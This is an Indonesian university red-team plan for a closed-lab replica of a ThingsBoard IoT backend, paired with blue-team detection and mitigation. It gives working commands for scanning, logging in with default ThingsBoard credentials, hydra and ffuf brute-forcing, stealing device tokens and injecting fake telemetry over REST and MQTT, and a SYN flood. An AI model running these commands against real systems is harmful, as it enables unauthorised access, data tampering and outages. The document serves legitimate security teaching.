# Red Team Attack Plan — Fase 2 (Minggu 10–11) · Backend KABITA

**Kelompok 4 · TEK1314 Kelas A**
**Target Node:** `192.168.4.5` (Ubuntu Server 26.04 + **ThingsBoard CE** + PostgreSQL)
**Attacker Node:** `192.168.4.100` (Kali Linux) · **Monitoring:** `192.168.4.200` (Security Onion)
**Penyusun:** Red Team — Raka Syauqi Ferdian (J0404241112), Zidan

Dokumen ini memenuhi Bagian IX panduan: **5 skenario, 4 kategori berbeda**, DoS maksimal satu
skenario, tools disebut eksplisit sejak rencana, dan setiap skenario menyasar celah yang benar-
benar ada pada replika backend KABITA (`docs/design/replica_setup.md` Bagian 4).

## 0. Rules of Engagement

| Aturan | Isi |
|---|---|
| Cakupan | Hanya `192.168.4.0/24` di jaringan lab tertutup. **Tidak ada** scanning/eksploitasi ke sistem Mitra atau internet. |
| Izin | Lead mencatat persetujuan tertulis (commit/chat) sebelum eksekusi; snapshot VM diambil sebelum tiap sesi. |
| Batas availability | DoS hanya RT-05, durasi ≤60 detik, satu service (ThingsBoard :8080), satu IP. |
| Data | Data telemetri sintetis (berat/pakan kambing fiktif); tidak ada data peternakan nyata. |
| Rollback | Snapshot `before-rt0X` dipulihkan setelah tiap skenario. |
| Etika | Semua temuan dilaporkan ke Blue Team lewat `docs/purple-team-log.md`. |

## 1. Ringkasan skenario

| ID | Kategori (Bagian IX) | Teknik | Tools | Target | Ekspektasi hasil |
|---|---|---|---|---|---|
| RT-01 | Reconnaissance | Port/service scan, fingerprint ThingsBoard, enumerasi MQTT | `nmap`, `whatweb`, `nmap --script mqtt-subscribe` | `192.168.4.5` | Peta port 8080/1883/5432/22; versi ThingsBoard & PostgreSQL teridentifikasi |
| RT-02 | Exploitation / Akses | Login kredensial default ThingsBoard + brute-force SSH | Burp Intruder, `hydra`, Metasploit `ssh_login` | `192.168.4.5:8080`, `:22` | Masuk sebagai tenant admin (melihat semua device) atau sebagai `iotadmin` (root server) |
| RT-03 | Web/API | Pencurian device access token → injeksi telemetri palsu via REST | Burp Suite, `curl`, `ffuf` | `http://192.168.4.5:8080` | Data `berat_kg`/`pakan_kg` palsu masuk ke dashboard KABITA |
| RT-04 | Web/API/Protokol IoT | MQTT spoof publish memakai token device (tanpa TLS) | `mosquitto_pub`, MQTT Explorer | `192.168.4.5:1883` | Telemetri/aktuator palsu diterima broker ThingsBoard |
| RT-05 | Availability (maks. 1) | SYN flood terkontrol pada dashboard | `hping3` | `192.168.4.5:8080` | Dashboard KABITA tidak dapat diakses ≤60 detik |

Kategori terpakai: **4 dari 5** (Recon, Exploitation, Web/API, Availability), dengan IoT-protocol
di dalam kategori Web/API/Protokol IoT. Availability hanya 1 dari 5.

## 2. RT-01 · Reconnaissance

**Sasaran:** memetakan backend KABITA. ThingsBoard mengekspos UI + REST (8080), MQTT (1883),
CoAP (5683/udp, bila aktif), PostgreSQL (5432), SSH (22).

```bash
mkdir -p ~/rt01 && cd ~/rt01
# 1. host discovery + full TCP
nmap -sS -p- -T4 --min-rate 1000 192.168.4.5 -oA rt01_fulltcp
# 2. versi + script default pada port yang relevan
nmap -sV -sC -p22,1883,5432,8080,5683 192.168.4.5 -oA rt01_services
# 3. fingerprint web (ThingsBoard punya halaman login khas)
whatweb -a 3 http://192.168.4.5:8080/
curl -s http://192.168.4.5:8080/api/noauth/activateByEmail | head -c 200
# 4. enumerasi MQTT (cek apakah CONNECT anonim ditolak)
nmap --script mqtt-subscribe -p1883 192.168.4.5
# 5. tangkap trafik scan untuk validasi deteksi
sudo tcpdump -i eth0 -w rt01_scan.pcap host 192.168.4.5
```

**Hasil yang diharapkan:** 4 port terbuka (22, 1883, 5432, 8080); banner/HTTP title
menunjukkan ThingsBoard; MQTT menolak CONNECT tanpa token (bukti token memang dipakai).
**Deteksi (Blue):** Zeek `Notice::Port_Scan`, Suricata ET SCAN, `nmap` NSE terlihat di `conn.log`.
**Mitigasi yang diuji:** B-1, B-2.

## 3. RT-02 · Exploitation — kredensial default ThingsBoard & SSH lemah

**Celah nyata:** banyak instalasi ThingsBoard dibiarkan memakai akun demo
(`tenant@thingsboard.org`/`tenant`, `sysadmin@thingsboard.org`/`sysadmin`), dan server-nya
memakai password SSH lemah.

```bash
# 1. uji kredensial default di UI/REST ThingsBoard
curl -s -X POST http://192.168.4.5:8080/api/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"tenant@thingsboard.org","password":"tenant"}' | head -c 400

# 2. brute-force formulir login dengan Burp Intruder / ffuf
ffuf -u http://192.168.4.5:8080/api/auth/login -X POST \
  -H 'Content-Type: application/json' \
  -d '{"username":"tenant@thingsboard.org","password":"FUZZ"}' \
  -w /usr/share/wordlists/rockyou.txt -mc 200 -mr '"token"'

# 3. brute-force SSH server (skala lab, terbatas)
hydra -l iotadmin -P /usr/share/wordlists/rockyou.txt ssh://192.168.4.5 -t 4 -f -V

# 4. ukur dampak bila SSH berhasil
ssh iotadmin@192.168.4.5 'id; hostname; sudo -n -l | head'
```

**Hasil yang diharapkan:** (a) token JWT tenant admin didapat → seluruh device & telemetri
kambing dapat dibaca/diubah; atau (b) login SSH `iotadmin` + sudo penuh → server backend dikuasai.
**Deteksi (Blue):** `auth.log` (`Failed password` berulang → `Accepted password`), Zeek `conn.log`
banyak koneksi singkat ke 22, log aplikasi ThingsBoard `Failed authentication`.
**Mitigasi yang diuji:** A-1, A-2, A-4, B-3 (+ wajib ganti akun default ThingsBoard).
**Tahap 5:** ulangi → akun default sudah diganti (401), hydra ter-ban fail2ban.

## 4. RT-03 · Web/API — pencurian device token & injeksi telemetri

**Celah nyata:** device access token dipakai sebagai satu-satunya kredensial perangkat dan
sering bocor (dashboard publik, URL API, log, tangkapan layar). Tanpa TLS, token terlihat di
jaringan. Setelah token didapat, penyerang dapat menulis telemetri palsu — pada KABITA artinya
**berat badan dan pakan kambing bisa dipalsukan**.

```bash
# 1. temukan token: dashboard publik / API tanpa auth / sniffing
curl -s http://192.168.4.5:8080/api/noauth/dashboard | head -c 300
ffuf -u http://192.168.4.5:8080/api/v1/FUZZ/telemetry -w tokens.txt -mc 200
sudo tcpdump -i eth0 -A -s0 'tcp port 8080 or tcp port 1883' | grep -i -m5 'token\|Bearer'

# 2. injeksi telemetri palsu via REST
TOKEN='<token-yang-didapat>'
curl -s -X POST "http://192.168.4.5:8080/api/v1/$TOKEN/telemetry" \
  -H 'Content-Type: application/json' \
  -d '{"berat_kg":99.9,"pakan_kg":0.1,"rfid":"KMB-999"}'

# 3. bukti di sisi aplikasi: dashboard menampilkan angka palsu
curl -s "http://192.168.4.5:8080/api/plugins/telemetry/DEVICE/<deviceId>/values/timeseries?keys=berat_kg,pakan_kg" \
  -H "X-Authorization: Bearer <jwt-tenant>"
```

**Hasil yang diharapkan:** telemetri palsu tersimpan dan tampil di dashboard KABITA — data
operasional peternakan tidak lagi dapat dipercaya (integritas data).
**Deteksi (Blue):** Suricata rule kustom "POST /api/v1/*/telemetry dari IP non-gateway",
Zeek `http.log` (URI berpola `/api/v1/`), anomali nilai telemetri (99,9 kg).
**Mitigasi yang diuji:** C-2 (rotasi token + validasi input), B-2 (batasi akses 8080),
A-2 (akun default diganti).
**Tahap 5:** token lama ditolak (401), nilai palsu tidak diterima setelah validasi rentang.

## 5. RT-04 · MQTT spoof publish (Web/API/Protokol IoT)

**Celah nyata:** transport MQTT ThingsBoard tanpa TLS; token perangkat dikirim sebagai
username dengan password kosong sehingga mudah disadap di segmen yang sama.

```bash
# 1. siapkan token (hasil RT-03 atau dari snapshot konfigurasi)
TOKEN='<token-device>'

# 2. dengarkan telemetri (bila ACL longgar)
mosquitto_sub -h 192.168.4.5 -p 1883 -u "$TOKEN" -P '' -t 'v1/devices/me/telemetry' -v

# 3. kirim telemetri palsu jalur MQTT
mosquitto_pub -h 192.168.4.5 -p 1883 -u "$TOKEN" -P '' \
  -t v1/devices/me/telemetry -m '{"berat_kg":12.0,"pakan_kg":9.9,"rfid":"KMB-001"}'

# 4. MQTT Explorer sebagai bukti visual topik v1/devices/me/*
```

**Hasil yang diharapkan:** broker menerima publish tanpa TLS dan dashboard menampilkan data
palsu; penyerang tidak perlu menyentuh perangkat timbangan sama sekali.
**Deteksi (Blue):** rule kustom MQTT — CONNECT dari IP selain gateway (`192.168.4.100` bukan
gateway), atau publish `v1/devices/me/telemetry` berkali-kali dari satu sumber.
**Mitigasi yang diuji:** C-2 (TLS + rotasi token), B-2 (ufw: 1883 hanya untuk gateway), A-2.
**Tahap 5:** TLS wajib (`Connection refused` tanpa TLS) dan token lama ditolak.

## 6. RT-05 · Availability — SYN flood terkontrol (maks. 1 skenario)

```bash
# 60 detik, satu service (ThingsBoard 8080), satu target
sudo timeout 60 hping3 -S --flood -V -p 8080 192.168.4.5
# pengukuran dampak
for i in $(seq 1 20); do
  curl -o /dev/null -s -w "%{http_code} %{time_total}\n" http://192.168.4.5:8080/login; sleep 1
done
```

**Hasil yang diharapkan:** dashboard melambat/timeout ≤60 detik, pulih setelahnya.
**Deteksi (Blue):** Suricata ET DOS, Zeek `conn.log` ribuan `S0` dari satu sumber.
**Mitigasi yang diuji:** `ufw limit 8080/tcp`, `syncookies`, rate limit per IP.
**Tahap 5:** ulangi → paket di-drop, `curl` tetap 200.

## 7. Peta skenario → deteksi → kontrol

| Skenario | Kategori | Deteksi utama (Blue Team) | Kontrol penutup |
|---|---|---|---|
| RT-01 | Reconnaissance | Zeek `Port_Scan`, ET SCAN | B-1, B-2 |
| RT-02 | Exploitation | `auth.log`, log auth ThingsBoard, Zeek `conn.log` | A-1, A-2, A-4, B-3 |
| RT-03 | Web/API | Rule HTTP `POST /api/v1/*/telemetry`, anomali nilai telemetri | C-2, B-2 |
| RT-04 | Web/API/IoT | Rule MQTT kustom (CONNECT non-gateway) | C-2, A-2, B-2 |
| RT-05 | Availability | ET DOS SYN flood, Zeek `S0` tinggi | `ufw limit`, syncookies |

## 8. Rencana eksekusi Fase 2

| Minggu | Aktivitas | PIC | Artefak |
|---|---|---|---|
| 10 (a) | Snapshot + pasang ThingsBoard (replika KABITA), catat konfigurasi awal | Blue | `docs/design/replica_setup.md`, `C2_before_*` |
| 10 (b) | Rekam baseline baru (dashboard + telemetri ThingsBoard) | Blue | `docs/blueteam/evidence/baseline/` |
| 10 (c) | RT-01 + RT-02: eksekusi & rekam | Red | `docs/redteam/evidence/rt01/`, `rt02/` |
| 10 (d) | Terapkan hardening prioritas (ganti akun default, ufw, token) | Blue | file bukti after |
| 11 (a) | RT-03 + RT-04 + RT-05 pada kondisi hardening baru | Red | `rt03/`, `rt04/`, `rt05/` |
| 11 (b) | Tahap 4–5 Purple Team Loop + Vulnerability Assessment Report | Blue + Red | `docs/purple-team-log.md` |

## 9. Format bukti per skenario

```
docs/redteam/evidence/<id>/
  <id>_command.txt   # perintah persis + timestamp
  <id>_output.txt    # output teks (nmap/curl/hydra)
  <id>_screen.png    # tangkapan layar terminal
  <id>_alert.png     # alert Security Onion (dari Blue Team)
  <id>_notes.md      # berhasil/gagal + analisis
```
